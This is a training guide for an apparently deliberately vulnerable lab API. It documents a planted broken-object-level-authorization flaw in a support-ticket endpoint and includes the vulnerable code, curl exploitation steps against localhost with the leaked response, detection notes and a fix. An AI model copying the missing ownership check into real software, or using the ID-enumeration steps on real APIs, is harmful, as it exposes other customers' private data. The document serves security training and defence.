# API1 — Broken Object Level Authorization (BOLA) · VulnMNO Pentest Guide

> **Status: live — implemented and verified.** This lab was added
> deliberately as new surface (a "ticket by reference" endpoint) rather than
> by weakening the existing, correctly-scoped ticket/invoice reads. The
> exploitation steps below were run against a live instance and the outputs
> shown are real.

OWASP API Security reference: **API1:2023 — Broken Object Level Authorization.**

## Why the existing endpoints were left alone

Every other customer-scoped read in the backend filters by the owning
`account_id`/`customer_id` at the query level and is correct:

```python
# app/routers/accounts.py:171-177 — get_invoice
select(Invoice).where(Invoice.public_id == invoiceId, Invoice.account_id == acct.id)

# app/routers/support.py:174-183 — _load_open_ticket
select(SupportTicket).where(
    SupportTicket.public_id == ticket_id, SupportTicket.customer_id == customer.id
)
```

Both return `404 Not Found` (not `403`) for a valid ID belonging to another
customer — the correct pattern (no existence oracle). The lab plants the bug
in **new** surface instead, mirroring how real BOLA bugs usually appear: a
newer endpoint added later forgets the pattern the older ones already use.

## Where it lives

- **Endpoint:** `GET /api/support/tickets/by-reference/{ticketId}`
- **Code:** `app/routers/support.py::get_ticket_by_reference`

```python
@router.get("/tickets/by-reference/{ticketId}", response_model=TicketRead)
async def get_ticket_by_reference(
    ticketId: str,
    customer: Annotated[Customer, Depends(get_current_customer)],
    session: Annotated[AsyncSession, Depends(get_session)],
):
    ticket = (
        await session.execute(
            select(SupportTicket)
            .where(SupportTicket.public_id == ticketId)
            .options(selectinload(SupportTicket.messages), selectinload(SupportTicket.attachments))
        )
    ).scalar_one_or_none()
    if ticket is None:
        raise not_found("Ticket not found")
    owner = (
        await session.execute(select(Customer).where(Customer.id == ticket.customer_id))
    ).scalar_one()
    return _full(ticket, owner)
```

## Why it is API1

The sibling endpoint `get_ticket` (`GET /api/support/tickets/{ticketId}`)
calls `_load_ticket_full`, which filters by
`SupportTicket.customer_id == customer.id`. `get_ticket_by_reference` reuses
the same `SupportTicket` model and the same `_full()` response builder but
drops that ownership clause entirely — the only check left is "does a ticket
with this `public_id` exist at all." Ticket IDs follow the sequential `TCK-`
convention (`_config/conventions.md`), so once a trainee has seen one valid
ID, enumerating the rest is trivial.

## How to find it (static analysis)

```bash
grep -n "select(SupportTicket)" src/backend/app/routers/support.py
```

Two hits: `_load_ticket_full` (has the `customer_id` filter) and
`get_ticket_by_reference` (doesn't) — the diff between them is the finding.

## Verified exploitation (actual run)

```bash
# Customer1 creates a ticket with sensitive content
curl -s -X POST http://localhost:8000/api/support/tickets \
  -H "Authorization: Bearer $TOKEN_CUST1" -H 'Content-Type: application/json' \
  -d '{"topic":"Billing","description":"CONFIDENTIAL - customer1 private ticket"}'
# -> {"ticketId":"TCK-30002", ...}

# Control: customer3 hits the NORMAL, correctly-scoped endpoint
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8000/api/support/tickets/TCK-30002 \
  -H "Authorization: Bearer $TOKEN_CUST3"
# -> 404  (correct — not this customer's ticket)

# Exploit: customer3 hits /by-reference/ for the SAME ticket
curl -s http://localhost:8000/api/support/tickets/by-reference/TCK-30002 \
  -H "Authorization: Bearer $TOKEN_CUST3"
```

Actual response (customer3's token, customer1's ticket):

```json
{"ticketId":"TCK-30002","customerId":"CUST-10001","topic":"Billing","status":"open",
 "createdAt":"2026-09-11T10:26:43","lastUpdatedAt":"2026-09-11T10:26:43",
 "description":"CONFIDENTIAL - customer1 private ticket",
 "messages":[{"messageId":"MSG-40002","ticketId":"TCK-30002",
   "author":{"role":"customer","displayName":"Alice García"},
   "body":"CONFIDENTIAL - customer1 private ticket","createdAt":"2026-09-11T10:26:43"}],
 "attachments":[]}
```

`customerId: "CUST-10001"` while authenticated as `CUST-10003` — confirmed
cross-customer read.

## Blue-team detection

```sql
-- Requires request logging that captures both the caller's customer_id and
-- the requested ticketId (not present by default — itself worth flagging).
-- Once present: any row where caller_customer_id != ticket owner's customer_id
-- on the by-reference path is a confirmed BOLA hit, not just a suspicious one.
```

## Remediation diff

```diff
-        select(SupportTicket).where(SupportTicket.public_id == ticketId)
+        select(SupportTicket).where(
+            SupportTicket.public_id == ticketId,
+            SupportTicket.customer_id == customer.id,
+        )
```

Same fix shape as `_load_ticket_full` — the lab exists to give trainees a
realistic "spot the missing clause" exercise.
